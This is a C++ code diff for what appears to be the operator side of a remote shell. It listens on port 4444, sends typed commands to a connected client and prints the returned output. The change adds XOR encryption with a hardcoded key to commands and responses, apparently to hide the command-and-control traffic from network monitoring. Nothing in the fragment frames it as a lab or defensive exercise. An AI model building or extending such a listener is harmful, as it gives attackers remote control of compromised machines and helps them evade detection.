@@ -4,6 +4,10 @@
 #include <sys/socket.h>
 #include <unistd.h>
 
+#include "encryption.hpp"
+
+const std::string XOR_KEY = "mysecretkey"; // Shared key
+
 constexpr int PORT = 4444;
 
 int main() {
@@ -51,18 +55,28 @@ int main() {
   // 6. Communicate with client
   while (true) {
     std::string command;
-    std::cout << "Enter command to run: ";
+    std::cout << "Shell> ";
     std::getline(std::cin, command);
 
-    send(client_socket, command.c_str(), command.size(), 0);
+    // encrypt the command to be sent
+    std::string encrypted = xor_encrypt(command, XOR_KEY);
+
+    send(client_socket, encrypted.c_str(), encrypted.size(), 0);
 
     if (command == "exit")
       break;
 
     char buffer[4096] = {};
     int bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
+
+    if (bytes_received <= 0)
+      break;
+
+    std::string encrypted_output(buffer, bytes_received);
+    std::string output = xor_decrypt(encrypted_output, XOR_KEY);
+
     if (bytes_received > 0) {
-      std::cout << "Output:\n" << buffer << "\n";
+      std::cout << "Output:\n" << output << "\n";
     }
   }
 
